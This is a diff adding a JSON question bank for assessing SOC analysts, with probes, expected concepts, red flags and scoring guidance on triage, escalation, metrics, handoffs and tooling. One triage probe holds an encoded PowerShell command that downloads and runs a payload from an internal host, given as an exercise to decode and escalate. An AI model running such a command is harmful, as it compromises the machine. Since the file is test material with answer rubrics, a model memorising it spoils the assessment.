@@ -1,0 +1,714 @@
+{
+  "domain": "soc_operations",
+  "display_name": "Security Operations / SOC Analyst",
+  "description": "Evaluates SOC operational skills including alert triage, escalation, playbook execution, tool stack management, and metrics-driven operations.",
+  "mitre_references": [
+    "TA0001",
+    "TA0002",
+    "TA0003",
+    "TA0005",
+    "TA0011",
+    "TA0040"
+  ],
+  "root_questions": [
+    {
+      "id": "soc_001",
+      "text": "Walk me through how you triage a security alert from the moment it hits your queue. What's your mental model for deciding if it's real?",
+      "difficulty_weight": 1.0,
+      "level": 1,
+      "category": "alert_triage",
+      "expected_concepts": [
+        "initial_assessment",
+        "context_gathering",
+        "source_reputation",
+        "asset_criticality",
+        "user_context",
+        "ioc_enrichment",
+        "false_positive_indicators",
+        "severity_classification"
+      ],
+      "red_flags": [
+        "close_without_investigation",
+        "no_context_gathering",
+        "only_check_one_source",
+        "no_documentation",
+        "closes_alerts_without_documenting_reasoning",
+        "no_context_gathering_before_decision",
+        "relies_on_single_source_for_verdict",
+        "doesnt_check_if_alert_is_part_of_a_larger_pattern",
+        "says_we_for_everything_without_specifying_personal_contribution",
+        "no_specific_numbers_or_metrics_when_describing_outcomes",
+        "describes_textbook_process_without_real_experience_examples"
+      ],
+      "depth_probes": [
+        {
+          "trigger_concepts": [
+            "context_gathering",
+            "asset_criticality",
+            "ioc_enrichment"
+          ],
+          "trigger_type": "concept_match",
+          "question": "You're triaging a CrowdStrike alert: 'Suspicious PowerShell execution' on a finance department workstation. The command is: `powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8AcABhAHkAbABvAGEAZAAnACkA`. What do you do?",
+          "level": 2,
+          "expected_concepts": [
+            "decode_base64",
+            "iex_download_string",
+            "internal_ip_c2",
+            "network_connection_check",
+            "process_tree_analysis",
+            "user_interview",
+            "lateral_movement_indicator",
+            "escalation_to_ir"
+          ],
+          "red_flags": [
+            "dont_decode",
+            "close_as_fp",
+            "no_escalation",
+            "only_block_ip"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "decode_base64",
+            "internal_ip_c2",
+            "escalation_to_ir"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Good catch on the internal IP. This is staging from an already-compromised host. You decode it and find IEX downloading from 10.10.10.10. That's your development server. You now have a potential insider threat or a compromised dev server. How do you handle this investigation when the scope just expanded?",
+          "level": 3,
+          "expected_concepts": [
+            "scope_expansion_protocol",
+            "dev_server_investigation",
+            "insider_threat_considerations",
+            "parallel_investigation_tracks",
+            "need_to_know_basis",
+            "hr_legal_engagement",
+            "network_isolation_decision",
+            "timeline_reconstruction"
+          ],
+          "red_flags": [
+            "ignore_insider_angle",
+            "investigate_alone",
+            "no_scope_expansion",
+            "alert_suspect"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "insider_threat_considerations",
+            "parallel_investigation_tracks",
+            "scope_expansion_protocol"
+          ],
+          "trigger_type": "concept_match",
+          "question": "This situation exposed that your SOC has no insider threat playbook, and your analysts weren't sure when to engage HR vs Legal vs management. Design the operational framework: what playbooks, escalation paths, and training does the SOC need for insider threat scenarios?",
+          "level": 4,
+          "expected_concepts": [
+            "insider_threat_program",
+            "legal_hold_procedures",
+            "evidence_handling_for_hr",
+            "classification_of_insider_scenarios",
+            "monitoring_vs_investigation_boundary",
+            "privacy_constraints",
+            "union_considerations",
+            "soc_analyst_training",
+            "tabletop_exercises"
+          ],
+          "red_flags": [
+            "treat_same_as_external",
+            "no_legal_framework",
+            "no_privacy_consideration"
+          ]
+        }
+      ],
+      "scoring_guidance": "Tests the analyst's mental model for triage. A strong answer shows a STRUCTURED approach that works across alert types, not just one memorized workflow. A 5/5 explains their decision criteria: what makes them escalate vs close, and WHY. They reference asset criticality, user context, and temporal patterns. A 3/5 describes a checklist without explaining the reasoning behind each step.",
+      "strong_answer_markers": [
+        "Has a structured mental model (not just a checklist)",
+        "Explains WHAT makes them escalate vs close with specific criteria",
+        "References asset criticality and user context in triage",
+        "Considers temporal patterns (time of day, frequency)",
+        "Documents their analysis even for false positives"
+      ]
+    },
+    {
+      "id": "soc_002",
+      "text": "How do you handle alert fatigue in a SOC? You're getting 500 alerts per shift and your analysts are burning out.",
+      "difficulty_weight": 1.25,
+      "level": 1,
+      "category": "alert_management",
+      "expected_concepts": [
+        "alert_tuning",
+        "false_positive_reduction",
+        "automation",
+        "soar_platform",
+        "prioritization",
+        "analyst_burnout",
+        "alert_categorization",
+        "metrics_tracking"
+      ],
+      "red_flags": [
+        "hire_more_analysts",
+        "ignore_problem",
+        "disable_alerts",
+        "no_tuning_process",
+        "solution_is_hire_more_analysts",
+        "disables_noisy_alerts_without_analysis",
+        "no_root_cause_analysis_of_alert_volume",
+        "claims_soar_solves_everything",
+        "says_we_for_everything_without_specifying_personal_contribution",
+        "no_specific_numbers_or_metrics_when_describing_outcomes",
+        "describes_textbook_process_without_real_experience_examples"
+      ],
+      "depth_probes": [
+        {
+          "trigger_concepts": [
+            "alert_tuning",
+            "automation",
+            "soar_platform"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Walk me through a specific SOAR playbook you'd build to automate the triage of phishing alerts. What enrichment steps run automatically, and what still needs a human?",
+          "level": 2,
+          "expected_concepts": [
+            "email_header_extraction",
+            "url_detonation",
+            "sender_reputation",
+            "attachment_sandboxing",
+            "user_verification",
+            "auto_quarantine_threshold",
+            "analyst_review_threshold",
+            "response_actions",
+            "metrics_collection"
+          ],
+          "red_flags": [
+            "auto_close_everything",
+            "no_human_review",
+            "no_enrichment",
+            "no_thresholds"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "auto_quarantine_threshold",
+            "analyst_review_threshold",
+            "enrichment"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Your SOAR automation is handling 70% of phishing alerts. But last week it auto-quarantined a legitimate email from a new vendor and caused a $200K deal to stall. Your CEO is upset. How do you handle this operationally, and how do you prevent it?",
+          "level": 3,
+          "expected_concepts": [
+            "false_positive_impact_analysis",
+            "vip_allowlist",
+            "confidence_scoring",
+            "human_in_the_loop_for_business_impact",
+            "exception_workflow",
+            "stakeholder_communication",
+            "automation_guardrails",
+            "rollback_capability"
+          ],
+          "red_flags": [
+            "disable_automation",
+            "blame_the_tool",
+            "no_guardrails",
+            "no_stakeholder_management"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "confidence_scoring",
+            "automation_guardrails",
+            "human_in_the_loop_for_business_impact"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Stepping back: you're designing the automation strategy for a SOC that processes 10,000 alerts per day across 15 detection categories. What's your framework for deciding what to automate, what to semi-automate, and what must stay manual? How do you measure whether automation is actually helping?",
+          "level": 4,
+          "expected_concepts": [
+            "automation_maturity_model",
+            "risk_based_automation_tiers",
+            "analyst_time_saved_metrics",
+            "mean_time_to_respond_impact",
+            "automation_accuracy_tracking",
+            "continuous_improvement_loop",
+            "soc_efficiency_metrics",
+            "cost_per_alert",
+            "analyst_satisfaction"
+          ],
+          "red_flags": [
+            "automate_everything",
+            "no_measurement",
+            "no_tiering",
+            "no_feedback_loop"
+          ]
+        }
+      ],
+      "scoring_guidance": "Tests operational leadership. Alert fatigue is the #1 SOC problem. A strong answer goes beyond 'tune the rules': addresses automation, prioritization, analyst workflow, and root cause (why are there 500 alerts?). A 5/5 discusses systemic solutions: risk-based alerting, detection consolidation, SOAR automation for enrichment. A 3/5 says 'tune rules and add automation' without specifics.",
+      "strong_answer_markers": [
+        "Diagnoses root cause of high volume before prescribing solutions",
+        "Distinguishes between tuning, consolidation, and automation",
+        "Considers analyst experience and workflow",
+        "Mentions specific SOAR use cases with measurable impact",
+        "Tracks improvement with metrics (before/after)"
+      ]
+    },
+    {
+      "id": "soc_003",
+      "text": "Describe the escalation process in your SOC. When does a Tier 1 analyst escalate to Tier 2, and when does it go to incident response?",
+      "difficulty_weight": 0.75,
+      "level": 1,
+      "category": "escalation_procedures",
+      "expected_concepts": [
+        "tier_model",
+        "escalation_criteria",
+        "severity_definitions",
+        "sla_requirements",
+        "documentation_before_escalation",
+        "warm_handoff",
+        "on_call_procedures"
+      ],
+      "red_flags": [
+        "no_defined_process",
+        "escalate_everything",
+        "escalate_nothing",
+        "cold_handoff_only",
+        "escalation_criteria_is_just_severity_high",
+        "cold_handoff_throw_it_over_the_wall",
+        "no_backup_plan_when_oncall_fails",
+        "analysts_afraid_to_escalate_false_positives",
+        "says_we_for_everything_without_specifying_personal_contribution",
+        "no_specific_numbers_or_metrics_when_describing_outcomes",
+        "describes_textbook_process_without_real_experience_examples"
+      ],
+      "depth_probes": [
+        {
+          "trigger_concepts": [
+            "escalation_criteria",
+            "severity_definitions",
+            "warm_handoff"
+          ],
+          "trigger_type": "concept_match",
+          "question": "It's 3 AM. Your Tier 1 analyst found what looks like ransomware pre-staging on a critical database server. The on-call Tier 2 isn't answering their phone. What's the protocol?",
+          "level": 2,
+          "expected_concepts": [
+            "backup_on_call",
+            "escalation_chain",
+            "skip_level_escalation",
+            "time_critical_containment",
+            "initial_containment_authority",
+            "communication_matrix",
+            "incident_commander_activation"
+          ],
+          "red_flags": [
+            "wait_for_tier2",
+            "analyst_contains_alone",
+            "no_backup_plan",
+            "send_email_and_wait"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "skip_level_escalation",
+            "incident_commander_activation",
+            "initial_containment_authority"
+          ],
+          "trigger_type": "concept_match",
+          "question": "After this incident, you realize your escalation process has single points of failure and no clear authority for containment during off-hours. Redesign the on-call and escalation framework for a 24/7 SOC with 12 analysts across 3 shifts.",
+          "level": 3,
+          "expected_concepts": [
+            "follow_the_sun",
+            "primary_secondary_oncall",
+            "escalation_automation",
+            "empowerment_framework",
+            "predefined_containment_actions",
+            "runbook_authority",
+            "management_notification_thresholds",
+            "cross_training"
+          ],
+          "red_flags": [
+            "single_oncall_only",
+            "no_empowerment",
+            "everything_needs_approval"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "empowerment_framework",
+            "predefined_containment_actions",
+            "follow_the_sun"
+          ],
+          "trigger_type": "concept_match",
+          "question": "There's a fundamental tension in SOC operations: you want analysts empowered to act fast, but you need controls to prevent mistakes. A Tier 1 analyst isolating the wrong production server at 3 AM could cost millions. How do you architect the authority model to balance speed and safety?",
+          "level": 4,
+          "expected_concepts": [
+            "tiered_authority_matrix",
+            "blast_radius_limits",
+            "automated_approval_for_low_risk",
+            "break_glass_procedures",
+            "post_action_review",
+            "simulation_training",
+            "guardrails_not_gates",
+            "reversible_vs_irreversible_actions"
+          ],
+          "red_flags": [
+            "no_framework",
+            "binary_thinking",
+            "all_authority_or_none"
+          ]
+        }
+      ],
+      "scoring_guidance": "Tests process maturity and communication. Real escalation is messy. A strong answer includes: clear criteria (not just severity), warm handoff process, documentation requirements BEFORE escalation, and what happens when the chain breaks. A 5/5 addresses the human element: analyst confidence to escalate, fear of false escalation, and how culture affects escalation behavior. A 3/5 describes the tier model mechanically.",
+      "strong_answer_markers": [
+        "Defines clear escalation criteria beyond just severity labels",
+        "Describes warm handoff with context transfer",
+        "Addresses what happens when the on-call doesn't answer",
+        "Discusses analyst empowerment to escalate without fear",
+        "Mentions documentation required before escalation"
+      ]
+    },
+    {
+      "id": "soc_004",
+      "text": "What metrics do you use to measure SOC performance? How do you know if your SOC is getting better or worse?",
+      "difficulty_weight": 0.75,
+      "level": 1,
+      "category": "soc_metrics",
+      "expected_concepts": [
+        "mttd",
+        "mttr",
+        "alert_volume",
+        "false_positive_rate",
+        "escalation_rate",
+        "analyst_utilization",
+        "sla_compliance"
+      ],
+      "red_flags": [
+        "no_metrics",
+        "only_count_tickets",
+        "vanity_metrics",
+        "no_trending",
+        "lists_metrics_without_explaining_how_they_use_them",
+        "tracks_ticket_count_as_primary_metric",
+        "no_trending_or_baseline_comparison",
+        "metrics_are_only_used_for_reporting_not_improvement",
+        "says_we_for_everything_without_specifying_personal_contribution",
+        "no_specific_numbers_or_metrics_when_describing_outcomes",
+        "describes_textbook_process_without_real_experience_examples"
+      ],
+      "depth_probes": [
+        {
+          "trigger_concepts": [
+            "mttd",
+            "mttr",
+            "false_positive_rate"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Your MTTD is 45 minutes and MTTR is 4 hours. Leadership wants both under 15 minutes and 1 hour respectively. What's your improvement plan, and what's realistic?",
+          "level": 2,
+          "expected_concepts": [
+            "decompose_mttd_mttr",
+            "automation_impact",
+            "detection_tuning_impact",
+            "playbook_optimization",
+            "tooling_gaps",
+            "measurement_accuracy",
+            "realistic_targets",
+            "benchmark_comparison"
+          ],
+          "red_flags": [
+            "promise_impossible_targets",
+            "only_work_harder",
+            "no_root_cause_analysis"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "decompose_mttd_mttr",
+            "automation_impact",
+            "realistic_targets"
+          ],
+          "trigger_type": "concept_match",
+          "question": "You've cut MTTR from 4 hours to 90 minutes through automation and playbooks. But your analyst team tells you the metrics are misleading because analysts are gaming the system: they're closing tickets faster without thorough investigation. How do you fix the measurement without killing morale?",
+          "level": 3,
+          "expected_concepts": [
+            "quality_metrics",
+            "investigation_depth_scoring",
+            "reopen_rate",
+            "peer_review",
+            "outcome_based_metrics",
+            "leading_vs_lagging_indicators",
+            "analyst_feedback_incorporation",
+            "balanced_scorecard"
+          ],
+          "red_flags": [
+            "add_more_metrics",
+            "punish_gaming",
+            "ignore_problem",
+            "trust_metrics_blindly"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "quality_metrics",
+            "outcome_based_metrics",
+            "balanced_scorecard"
+          ],
+          "trigger_type": "concept_match",
+          "question": "You're presenting to the board. They want to know: what's the ROI of our SOC? Every dollar we spend on the SOC, what do we get back? How do you answer this question, and what would you push back on in how it's framed?",
+          "level": 4,
+          "expected_concepts": [
+            "risk_reduction_quantification",
+            "incident_cost_avoidance",
+            "insurance_model",
+            "compliance_requirement",
+            "challenge_roi_framing_for_security",
+            "risk_appetite_alignment",
+            "peer_benchmarking",
+            "breach_cost_modeling",
+            "value_at_risk"
+          ],
+          "red_flags": [
+            "make_up_roi_numbers",
+            "cant_articulate_value",
+            "no_pushback_on_framing"
+          ]
+        }
+      ],
+      "scoring_guidance": "Tests analytical and leadership maturity. Metrics are easy to list; using them to drive improvement is hard. A strong answer explains HOW they use metrics to identify problems and measure improvement, not just what they track. A 5/5 warns about vanity metrics and gaming, and proposes OUTCOME-based measurement. A 3/5 lists MTTD/MTTR without explaining how they use them.",
+      "strong_answer_markers": [
+        "Names specific metrics AND explains how they drive decisions",
+        "Discusses metric gaming and how to prevent it",
+        "Distinguishes between leading and lagging indicators",
+        "Connects metrics to business outcomes, not just operational stats",
+        "Has improved a metric through a specific action (with numbers)"
+      ]
+    },
+    {
+      "id": "soc_005",
+      "text": "You're running a shift handoff between the day and night SOC teams. What information gets passed, and how do you ensure nothing falls through the cracks?",
+      "difficulty_weight": 1.0,
+      "level": 1,
+      "category": "shift_operations",
+      "expected_concepts": [
+        "handoff_template",
+        "active_investigations",
+        "pending_actions",
+        "escalated_items",
+        "environmental_context",
+        "tool_status",
+        "verbal_plus_written"
+      ],
+      "red_flags": [
+        "no_handoff_process",
+        "only_verbal",
+        "only_written",
+        "skip_handoffs",
+        "handoff_is_just_a_verbal_chat",
+        "no_ownership_assignment_for_active_investigations",
+        "skips_environmental_context",
+        "has_never_had_a_handoff_failure_that_they_know_of",
+        "says_we_for_everything_without_specifying_personal_contribution",
+        "no_specific_numbers_or_metrics_when_describing_outcomes",
+        "describes_textbook_process_without_real_experience_examples"
+      ],
+      "depth_probes": [
+        {
+          "trigger_concepts": [
+            "handoff_template",
+            "active_investigations",
+            "verbal_plus_written"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Despite your handoff process, an investigation was dropped between shifts last month. The night team thought the day team was handling it, and vice versa. A lateral movement incident went uninvestigated for 8 hours. What went wrong and how do you fix it?",
+          "level": 2,
+          "expected_concepts": [
+            "ownership_assignment",
+            "ticket_state_machine",
+            "aging_alert_monitoring",
+            "handoff_verification",
+            "explicit_acknowledgment",
+            "automated_reminders",
+            "blameless_review"
+          ],
+          "red_flags": [
+            "blame_individuals",
+            "add_more_meetings",
+            "accept_it_happens"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "ownership_assignment",
+            "ticket_state_machine",
+            "automated_reminders"
+          ],
+          "trigger_type": "concept_match",
+          "question": "You're building a SOC from scratch with a remote-first team across 3 time zones. No physical war room. How do you design the operational rhythm: shift handoffs, collaboration, knowledge sharing, and team cohesion?",
+          "level": 3,
+          "expected_concepts": [
+            "async_communication_tools",
+            "shared_ticketing_system",
+            "video_handoffs",
+            "knowledge_base",
+            "runbook_library",
+            "slack_or_teams_channels",
+            "structured_updates",
+            "team_building_remote",
+            "documentation_culture"
+          ],
+          "red_flags": [
+            "require_colocation",
+            "no_async_plan",
+            "ignore_team_cohesion"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "documentation_culture",
+            "async_communication_tools",
+            "knowledge_base"
+          ],
+          "trigger_type": "concept_match",
+          "question": "SOC analyst burnout is an industry-wide problem. Average tenure is 18 months before they leave or move to another role. You're losing institutional knowledge every time someone leaves. How do you architect the SOC to be resilient to turnover, and what would you change about how the industry approaches SOC careers?",
+          "level": 4,
+          "expected_concepts": [
+            "knowledge_capture_automation",
+            "career_progression_framework",
+            "rotation_programs",
+            "skill_development_investment",
+            "automation_of_boring_work",
+            "meaningful_work_allocation",
+            "competitive_compensation",
+            "challenge_soc_tier_model",
+            "soc_as_training_ground"
+          ],
+          "red_flags": [
+            "accept_turnover",
+            "no_career_framework",
+            "only_pay_more"
+          ]
+        }
+      ],
+      "scoring_guidance": "Tests operational discipline. Shift handoffs are where investigations die. A strong answer has a SPECIFIC template/format, combines written AND verbal, and includes environmental context (ongoing campaigns, system status). A 5/5 has dealt with a dropped investigation and built process to prevent it. A 3/5 describes a handoff process but hasn't iterated on it.",
+      "strong_answer_markers": [
+        "Has a specific handoff template or format they use",
+        "Combines written documentation with verbal briefing",
+        "Includes environmental context (active threats, system status)",
+        "Has dealt with a handoff failure and improved the process",
+        "Uses explicit ownership assignment for in-progress work"
+      ]
+    },
+    {
+      "id": "soc_006",
+      "text": "What's your tool stack for a SOC, and how do you evaluate whether a tool is actually helping your team versus creating more work?",
+      "difficulty_weight": 0.75,
+      "level": 1,
+      "category": "tool_stack",
+      "expected_concepts": [
+        "siem",
+        "edr",
+        "soar",
+        "threat_intel_platform",
+        "ticketing",
+        "integration_importance",
+        "tool_rationalization",
+        "analyst_feedback"
+      ],
+      "red_flags": [
+        "name_tools_without_understanding",
+        "no_evaluation_criteria",
+        "more_tools_equals_better",
+        "names_tools_without_evaluation_criteria",
+        "more_tools_is_better_mindset",
+        "no_consideration_of_analyst_training_cost",
+        "evaluates_tools_by_vendor_demo_not_real_use",
+        "says_we_for_everything_without_specifying_personal_contribution",
+        "no_specific_numbers_or_metrics_when_describing_outcomes",
+        "describes_textbook_process_without_real_experience_examples"
+      ],
+      "depth_probes": [
+        {
+          "trigger_concepts": [
+            "integration_importance",
+            "tool_rationalization",
+            "analyst_feedback"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Your SOC has Splunk SIEM, CrowdStrike EDR, Palo Alto firewalls, Demisto SOAR, ThreatConnect TIP, and ServiceNow ticketing. Analysts complain they have 6 tabs open and spend half their time pivoting between tools. What do you do?",
+          "level": 2,
+          "expected_concepts": [
+            "single_pane_of_glass",
+            "api_integrations",
+            "soar_as_orchestrator",
+            "context_enrichment_automation",
+            "reduce_tab_switching",
+            "workflow_optimization",
+            "analyst_ux_research"
+          ],
+          "red_flags": [
+            "add_another_tool",
+            "tell_analysts_to_deal_with_it",
+            "replace_everything"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "api_integrations",
+            "soar_as_orchestrator",
+            "workflow_optimization"
+          ],
+          "trigger_type": "concept_match",
+          "question": "Your SIEM contract is up for renewal. Splunk wants $2M/year. The CISO asks you to evaluate alternatives: Microsoft Sentinel, Google Chronicle, and an open-source stack (ELK + Wazuh). How do you run this evaluation for a 100-person company?",
+          "level": 3,
+          "expected_concepts": [
+            "total_cost_of_ownership",
+            "migration_cost",
+            "detection_content_portability",
+            "analyst_retraining",
+            "integration_ecosystem",
+            "data_ingestion_pricing_model",
+            "vendor_lock_in",
+            "poc_criteria",
+            "parallel_operation_period"
+          ],
+          "red_flags": [
+            "cheapest_wins",
+            "no_migration_consideration",
+            "no_poc",
+            "ignore_team_impact"
+          ]
+        },
+        {
+          "trigger_concepts": [
+            "total_cost_of_ownership",
+            "detection_content_portability",
+            "vendor_lock_in"
+          ],
+          "trigger_type": "concept_match",
+          "question": "The security tool market is consolidating rapidly. XDR vendors want to be your single platform. How do you think about platform consolidation versus best-of-breed for security operations? What's your framework, and where does the industry get this wrong?",
+          "level": 4,
+          "expected_concepts": [
+            "platform_vs_best_of_breed_tradeoffs",
+            "vendor_dependency_risk",
+            "api_first_architecture",
+            "data_portability",
+            "open_standards",
+            "consolidation_for_small_teams",
+            "best_of_breed_for_mature_teams",
+            "exit_strategy",
+            "multi_vendor_strategy"
+          ],
+          "red_flags": [
+            "all_in_on_one_vendor",
+            "no_strategic_thinking",
+            "no_exit_strategy"
+          ]
+        }
+      ],
+      "scoring_guidance": "Tests tool strategy beyond naming products. A strong answer evaluates tools by ANALYST IMPACT, not feature lists. Integration between tools matters more than individual tool capability. A 5/5 has rationalized a tool stack: removed redundant tools, measured impact, and optimized for analyst workflow. A 3/5 names the standard stack without evaluation criteria.",
+      "strong_answer_markers": [
+        "Evaluates tools by analyst workflow impact, not just features",
+        "Discusses integration between tools as critical factor",
+        "Has experience removing or replacing a tool with measurable improvement",
+        "Considers total cost: license + training + maintenance + integration",
+        "Gets analyst feedback before making tool decisions"
+      ]
+    }
+  ]
+}
